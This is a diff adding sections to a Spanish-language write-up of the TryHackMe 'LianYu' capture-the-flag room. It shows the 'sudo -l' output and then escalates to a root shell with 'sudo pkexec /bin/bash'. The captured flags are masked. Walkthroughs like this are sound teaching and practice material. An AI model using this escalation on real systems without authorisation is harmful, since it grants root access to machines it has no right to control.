@@ -335,6 +335,8 @@ s@@@@@10.10.44.255's password:
 ```
 
 Ahora vamos a ver que tiene el usuario en su carpeta.
+
+**SALIDA DEL COMANDO**
 ```bash
 s@@@@@LianYu:~$ ls -la
 total 32
@@ -348,5 +350,52 @@ drwxr-xr-x 4 root  root  4096 May  1  2020 ..
 -r-------- 1 slade slade   63 May  1  2020 user.txt
 ```
 
+### PREGUNTAS SOBRE LO ENCONTRADO
 
+- user.txt
 
+```bash
+THM{P30@@@@@@@@@@@@53@@@@@@@@@@@@@@@@@@@0N@@}
+```
+
+## DENTRO DEL ROOT
+
+Ahora vamos a ver que aplicación tiene el usuario con privilegios de root, con lo cual vamos a usar el comando **sudo -l** para que nos diga que aplicación tiene privilegio.
+
+**SALIDA DEL COMANDO**
+```bash
+Matching Defaults entries for slade on LianYu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User slade may run the following commands on LianYu:
+    (root) PASSWD: /usr/bin/pkexec
+```
+
+Vemos que tiene tiene una aplicación con privilegio de root con lo cual vamos usarla como sudo y vamos a ver que tiene la carpeta del usuario root.
+
+**SALIDA DEL COMANDO**
+```bash
+s@@@@@@LianYu:~$ sudo pkexec /bin/bash
+root@LianYu:~# ls -la
+total 28
+drwx------  3 root root 4096 May  1  2020 .
+drwxr-xr-x 23 root root 4096 May  1  2020 ..
+-rw-------  1 root root   22 May  1  2020 .bash_history
+-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
+drwx------  2 root root 4096 May  1  2020 .gnupg
+-rw-r--r--  1 root root  140 Nov 19  2007 .profile
+-rw-r--r--  1 root root  340 May  1  2020 root.txt 
+```
+
+### PREGUNTAS SOBRE LO ENCONTRADO
+
+- root.txt
+
+```bash
+THM{MY_@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@_CON@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@I@@@@@@@@@@@@@34D}
+```
+
+Con todo esto ya hemos terminado.
+
+![FINAL](/assets/img/HACKER_ETICO/LIAN-YU/WEB_06.png)
